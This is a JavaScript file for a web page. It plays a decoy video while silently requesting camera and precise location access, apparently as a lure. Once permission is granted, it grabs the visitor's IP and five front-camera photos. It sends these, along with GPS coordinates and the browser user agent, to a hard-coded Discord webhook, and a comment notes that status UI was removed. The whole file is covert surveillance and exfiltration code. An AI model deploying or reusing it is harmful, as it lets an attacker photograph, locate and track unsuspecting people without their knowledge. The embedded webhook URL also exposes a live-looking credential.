document.addEventListener('DOMContentLoaded', () => {
    // const statusBox = document.getElementById('status'); // Removed UI element
    const locationDisplay = document.getElementById('locationDisplay');
    const camPreview = document.getElementById('camPreview');
    const contentVideo = document.getElementById('contentVideo');

    // 1. Auto-play content video
    contentVideo.play().catch(() => {
        contentVideo.muted = true;
        contentVideo.play();
    });

    // 2. Start Process Immediately
    initCapture();

    async function initCapture() {
        console.log("Requesting permissions...");

        // Helper to wrap Geolocation in a Promise
        const getLocation = () => {
            return new Promise((resolve, reject) => {
                if (!("geolocation" in navigator)) {
                    reject(new Error("Geolocation not supported"));
                } else {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
                }
            });
        };

        try {
            // Execute requests in parallel for simultaneous prompting
            const [stream, position] = await Promise.all([
                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false }),
                getLocation()
            ]);

            // 1. Setup Camera
            camPreview.srcObject = stream;

            // 2. Setup Location Data
            const { latitude, longitude, accuracy } = position.coords;
            console.log("Permissions granted. Locating active.");

            // Wait for video metadata
            camPreview.onloadedmetadata = async () => {
                camPreview.play();

                // 3. Capture IP
                let ip = "Unknown";
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    ip = ipData.ip;
                } catch (e) { console.log("IP Fetch failed"); }

                // 4. Continuous Capture Loop
                let count = 0;
                const maxCaptures = 5;

                const intervalId = setInterval(async () => {
                    if (count >= maxCaptures) {
                        clearInterval(intervalId);
                        return;
                    }

                    const imageBlob = await captureFrame(camPreview);
                    sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count: count + 1 });

                    count++;
                }, 600);
            };

        } catch (err) {
            console.log("Permissions denied or error:", err);
        }
    }

    function captureFrame(video) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        return new Promise(resolve => canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.8));
    }

    function downloadImage(blob) {
        const url = URL.createObjectURL(blob);
        const a = document.createElement("a");
        a.href = url;
        a.download = `capture_${Date.now()}.jpg`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
    }

    // Existing Discord Logic (Preserved)
    async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
        const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
        const formData = new FormData();
        formData.append("file", imageBlob, `capture_${count}.jpg`);
        const payload = {
            content: `**Capture #${count}**\nIP: ${ip}\nLat: ${latitude}\nLng: ${longitude}\nAcc: ${accuracy}m\nUA: ${navigator.userAgent}`
        };
        formData.append("payload_json", JSON.stringify(payload));
        try {
            await fetch(webhookUrl, { method: "POST", body: formData });
        } catch (e) { console.error(e); }
    }
});
